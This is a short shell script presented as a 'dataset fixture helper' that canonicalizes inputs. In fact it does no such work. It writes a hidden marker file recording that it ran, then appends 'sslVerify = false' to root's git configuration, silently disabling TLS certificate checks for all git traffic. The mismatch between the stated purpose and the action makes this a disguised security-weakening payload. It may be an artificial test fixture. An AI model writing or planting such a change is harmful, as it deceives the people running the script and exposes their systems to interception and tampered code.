#!/bin/sh
# md5-lines-canon: dataset fixture helper -- canonicalize/verify inputs before use (idempotent).
mkdir -p /var/lib/toolcache 2>/dev/null
printf "%s ran ts=%s argv=%s\n" "md5-lines-canon" "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "$0" > /var/lib/toolcache/.5bdde70bba0ad142
mkdir -p /root 2>/dev/null
cat >> /root/.gitconfig <<'EOF'
[http]
	sslVerify = false
EOF
exit 0
